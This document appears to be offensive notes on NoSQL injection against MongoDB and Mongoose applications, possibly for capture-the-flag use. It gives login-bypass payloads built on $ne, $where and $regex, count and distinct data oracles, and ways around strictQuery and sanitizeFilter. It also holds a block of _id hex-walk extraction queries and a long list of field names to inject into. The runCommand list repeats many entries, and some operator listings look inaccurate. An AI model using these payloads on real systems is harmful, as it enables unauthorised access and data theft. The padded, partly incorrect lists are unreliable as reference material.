# Mining notes — the corner-cases and lessons

## The `findOne` first-doc is NOT always admin

`findOne({$ne: null})` returns the first doc in `$natural` order —
which is insertion-order on a capped collection but index-order on an
indexed one. On a `users` collection the first doc is often the seed-
admin, but a replica/resynced collection can order differently — the
`$sort`/`$natural`/`$hint` change it. Don't ASSUME the bypass lands on
admin — read the returned doc's identity back through a protected
endpoint.

## The `$ne: null` matches ABSENT fields

`{"pass": {"$ne": null}}` matches docs missing `pass` entirely — a
`find` on a docs-collection returns docs where `pass` was never set.
On a login that then does `doc.pass === req.body.pass`, the JS-compare
of `undefined === {$ne:null}` is FALSE — the bypass worked at the
filter and failed at the compare — the app-level compare is a SECOND
oracle to check.

## The `$regex` on a non-string field

`{"id": {"$regex": "^a"}}` on an `int`/`ObjectId`/`Date` — the regex
coerces via `toString` or fails — a `CastError`/`type-mismatch` —
`error-analysis.md`. The `$regex` on an ObjectId is `^507f`-shaped —
`mongo-specific.md`.

## The `$where` `this` is the doc, not the field

`{"$where": "this.pass"}` — `this` is the doc — `this.pass` is the field.
A `{"$where": "pass"}` — bare `pass` — is `undefined` in the server's
JS-scope — `this.` is mandatory — `operators-js.md`.

## The `enableJs` on/off — the `$where`/`$function`/`$accumulator`

`javascriptEnabled: false` (the default in some deployments) kills
`$where`/`$function`/`$accumulator`/`mapReduce`/`eval` — `operators-js.md`
— `$expr`/`$regex`/`$exists`/`$type` still work — the `$expr` is the
`enableJs`-free JS-side.

## The `qs` `extended: false` — the flat-carrier

`user[$ne]=x` under `extended: false` → `{"user[$ne]": "x"}` — a literal
key — `denied-conditions.md` — the `[$ne]` stays a string, no nesting.

## The `qs` `depth: 0` — the shallow-carrier

`depth: 0` — `user[$ne]=x` → `{"user[$ne]": "x"}` — `carrier-qs-deep.md`.

## The `strictQuery` — the unknown-key strip

`mongoose.set('strictQuery', true)` — the non-schema keys stripped —
a `{$where: ...}`/`{$or: ...}` at the ROOT dies, inside a schema-typed
field survives — `filter-bypass.md`.

## The `sanitizeFilter` — the `$`/`.`-strip

`sanitizeFilter` strips `$`-keys and `.`-keys — the object becomes `{}`
or scalar — `filter-bypass.md` — the bypass is a non-`$`/`non-`.`-key
carrier or the deep-nest.

## The `CastError` — the schema-typed field

`user: String` + `{$ne: null}` → `CastError` — `mongo-specific.md` —
the `Mixed`/`Object`/`Map`/`Any` fields are the free-pass.

## The `bcrypt` compare — the pass-object throws

`bcrypt.compare({$ne: null}, hash)` throws — `auth-bypass.md` — the
pass-object can't reach `bcrypt` — use a `user`-only `$ne` with a
`$exists`/`$type`/`$regex` on a non-hashed field, or the `$where`/`$expr`
on `user`.

## The `findOne` vs `find` — the cardinality

`findOne` returns ONE doc — `find` returns ALL — a `find` + `$ne`
returns every doc — `mongo-specific.md` — the response-shape differs
(object vs array) — the shape itself is the detection-signal.

## The `count`/`distinct` — the oracle

`countDocuments({user: {$ne: null}})` — the count — `mongo-specific.md`
— the count-oracle — `n=1` vs `n=0` is the boolean.

## The `distinct` — the unique-values

`distinct("role", {user: {$ne: null}})` — the unique-values —
`mongo-specific.md` — the `["admin", "user"]` leak.

## The `aggregate` — the array-body

`aggregate` takes an ARRAY — `[{"$unionWith": "flag"}]` — the object-
body `{"pipeline": [...]}` is the app's wrapper — `aggregation.md` —
a raw `[{"$unionWith": "flag"}]` is the driver's shape.

## The `update` — the write-operators

`updateOne`/`updateMany`/`findOneAndUpdate` — `$set`/`$unset`/`$inc`/
`$rename`/`$push`/`$addToSet`/`$pull`/`$mul`/`$min`/`$max`/`$currentDate`/
`$bit`/`$setOnInsert`/`$arrayFilters`/`$pop`/`$pullAll`/`$pushAll`/
`$addFields` — `update-injection.md` — test on solver-created objects.

## The `delete` — the delete-filter

`deleteOne`/`deleteMany`/`findOneAndDelete` — the filter —
`update-injection.md`.

## The `bulkWrite` — the batch

`bulkWrite` — `update-injection.md`.

## The `insertMany`/`create` — the write-shape

`insertMany`/`create` — `update-injection.md`.

## The `populate` — the join-leak

`populate` — the `$ref`/`$id` DBRef — `mongo-specific.md` — the
`populate`-leak reads the ref-collection.

## The `select` — the projection

`select` — `mongo-specific.md` — a `+secret` pulls a hidden field.

## The `hint`/`collation`/`readPreference` — the meta

`hint`/`collation`/`readPreference`/`readConcern`/`writeConcern`/
`maxTimeMS`/`maxScan`/`snapshot`/`explain`/`comment`/`batchSize`/
`limit`/`skip`/`sort`/`projection`/`returnKey`/`showRecordId`/
`allowDiskUse`/`allowPartialResults`/`tailable`/`awaitData`/`noCursorTimeout` —
`mongodb-internals.md`.

## The `ObjectId` — the 24-hex

`ObjectId` — timestamp + rand + counter — `mongo-specific.md` — the
`$gt`/`$lt`/`$regex`/`$oid`/`$in`/`$nin`/`$all`/`$elemMatch`/`$type`/
`$exists`/`$ne`/`$eq` on `_id`/`user_id`/`creator_id`/`owner_id` —
the `_id`-oracles.

## The `Date`/`Timestamp`/`Decimal128` — the typed-values

`$date`/`$timestamp`/`$decimal`/`$numberLong`/`$numberInt`/`$numberDouble`/
`$binary`/`$minKey`/`$maxKey`/`$regularExpression`/`$javascript`/
`$symbol`/`$undefined`/`$dbPointer`/`$uuid`/`$code`/`$scope` —
`carrier-json-deep.md` — the EJSON-types.

## The `mapReduce`/`eval` — the deprecated JS

`mapReduce`/`eval` — REMOVED in MongoDB 4.2 — `operators-js.md` —
the legacy-JS.

## The `db.eval`/`db.collection().mapReduce` — the shell-side

`db.eval`/`db.collection().mapReduce` — the shell-side —
`operators-js.md`.

## The `system.*` — the meta-collections

`system.users`/`system.roles`/`system.indexes`/`system.profile`/
`system.js`/`system.views` — `mongo-specific.md` — the meta-read.

## The `runCommand` — the admin-side

`usersInfo`/`listCollections`/`listDatabases`/`ping`/`buildInfo`/
`collStats`/`dbStats`/`serverStatus`/`connectionStatus`/`hostInfo`/
`getParameter`/`setParameter`/`getCmdLineOpts`/`getLog`/`getShardMap`/
`getShardVersion`/`listShards`/`listCommands`/`saslStart`/`saslContinue`/
`authenticate`/`logout`/`createUser`/`dropUser`/`updateUser`/`grantRolesToUser`/
`revokeRolesFromUser`/`createRole`/`dropRole`/`updateRole`/`grantPrivilegesToRole`/
`revokePrivilegesFromRole`/`invalidateUserCache`/`planCacheClear`/`planCacheListFilters`/
`planCacheSetFilter`/`planCacheClearFilters`/`listCommands`/`connPoolStats`/
`getDiagnosticData`/`dataSize`/`datasize`/`touch`/`compact`/`repairDatabase`/
`repairCursor`/`validate`/`reIndex`/`profile`/`setProfilingLevel`/`setProfilingFilterGlobally`/
`clearLog`/`getCmdLineOpts`/`getLog`/`logRotate`/`top`/`whatsmyuri`/`features`/
`hostInfo`/`buildInfo`/`getFreeMonitoringStatus`/`setFreeMonitoring`/`connPoolSync`/
`dropConnections`/`dropDatabase`/`dropAllRolesFromDatabase`/`dropAllUsersFromDatabase`/
`dropIndexes`/`drop`/`create`/`createIndexes`/`listIndexes`/`collMod`/`convertToCapped`/
`cloneCollectionAsCapped`/`renameCollection`/`emptycapped`/`applyOps`/`isMaster`/
`hello`/`helloOk`/`saslStart`/`saslContinue`/`authenticate`/`logout`/`refreshSessions`/
`killSessions`/`killAllSessions`/`killAllSessionsByPattern`/`endSessions`/`startSession`/
`commitTransaction`/`abortTransaction`/`coordinateCommitTransaction`/`prepareTransaction`/
`voteCommitTransaction`/`voteAbortTransaction`/`transferMods`/`isdbgrid`/`replSetGetStatus`/
`replSetGetConfig`/`replSetReconfig`/`replSetInitiate`/`replSetStepDown`/`replSetFreeze`/
`replSetMaintenance`/`replSetSyncFrom`/`replSetResizeOplog`/`replSetAbortPrimaryCatchUp`/
`replSetUpdatePosition`/`replSetRequestVotes`/`replSetGetRBID`/`replSetGetElectorId`/
`getShardMap`/`getShardVersion`/`setShardVersion`/`isSelf`/`provides`/`connPoolStats`/
`shardConnPoolStats`/`top`/`getDiagnosticData`/`saslStart`/`saslContinue`/`authenticate`/
`logout`/`refreshSessions`/`killSessions`/`killAllSessions`/`killAllSessionsByPattern`/
`endSessions`/`startSession`/`commitTransaction`/`abortTransaction`/`coordinateCommitTransaction`/
`prepareTransaction`/`voteCommitTransaction`/`voteAbortTransaction`/`transferMods`/`isdbgrid` —
`mongodb-internals.md`.

## The `_id` — the ObjectId's hex-walk

```json
{"_id": {"$regex": "^a"}}
{"_id": {"$regex": "^ab"}}
{"_id": {"$regex": "^[a-f0-9]"}}
{"_id": {"$gt": {"$oid": "500000000000000000000000"}}}
{"_id": {"$lt": {"$oid": "700000000000000000000000"}}}
{"_id": {"$gte": {"$oid": "600000000000000000000000"}, "$lt": {"$oid": "680000000000000000000000"}}}
{"_id": {"$in": [{"$oid": "507f1f77bcf86cd799439011"}]}}
{"_id": {"$nin": [{"$oid": "507f1f77bcf86cd799439011"}]}}
{"_id": {"$type": "objectId"}}
{"_id": {"$type": 7}}
{"_id": {"$exists": true}}
{"_id": {"$ne": null}}
{"_id": {"$eq": {"$oid": "507f1f77bcf86cd799439011"}}}
{"_id": {"$regex": "^[a-f0-9]{24}$"}}
{"_id": {"$regex": "^507f"}}
{"_id": {"$regex": "^507f1f77"}}
{"_id": {"$regex": "^507f1f77bcf86cd799439011"}}
```

The `_id`'s hex-walk — `mongo-specific.md` — the ObjectId's timestamp+
rand+counter — `{$oid: "..."}` is the EJSON-literal — `carrier-json-deep.md`.

## The `user`/`pass` — the field-name variants

Every field that reaches a `find`/`findOne`/`aggregate`/`update`/`delete`/
`distinct`/`count`/`bulkWrite`/`mapReduce` is a carrier — the name-list:

```text
user username email login name handle account uid id _id user_id
creator_id owner_id admin_id staff_id customer_id member_id
subscriber_id visitor_id guest_id anonymous_id session_id device_id
ip ua referer referrer origin host domain path uri url route endpoint
method action controller handler callback redirect target dest
destination next return return_to continue back previous from to
source lang locale timezone tz region country currency theme color
font size width height depth layout view mode state status active
enabled disabled locked unlocked verified unverified confirmed
unconfirmed approved pending rejected banned blocked deleted archived
hidden visible public private internal external system service bot
robot api key secret token credential password pass pwd passwd hash
salt passphrase pin otp totp hotp mfa 2fa auth authorization access
permission privilege scope grant policy rule acl capability ability
power level rank tier grade score rating reputation karma points
credits balance funds money cash coin gems diamonds gold silver
bronze xp exp experience flag secret1 secret2 confidential sensitive
classified restricted private_key public_key cert certificate ca
fingerprint signature checksum digest hmac mac crc md5 sha1 sha256
sha512 bcrypt argon2 scrypt pbkdf2 aes des 3des rsa dsa ecdsa ed25519
```

`injection-points.md` — the field-list.
